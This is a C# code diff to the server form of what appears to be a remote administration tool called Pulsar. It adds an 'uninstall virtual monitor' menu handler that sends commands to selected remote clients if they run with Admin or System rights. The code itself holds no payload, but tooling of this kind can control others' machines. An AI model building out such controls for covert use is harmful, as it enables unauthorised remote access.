@@ -1397,7 +1397,7 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void installVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
+        private void installVirtualMonitorToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
@@ -1406,6 +1406,23 @@ namespace Pulsar.Server.Forms
                 if (isClientAdmin)
                 {
                     c.Send(new DoInstallVirtualMonitor());
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void uninstallVirtualMonitorToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                //check if client is admin
+                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";
+                if (isClientAdmin)
+                {
+                    c.Send(new DoUninstallVirtualMonitor());
                 }
                 else
                 {
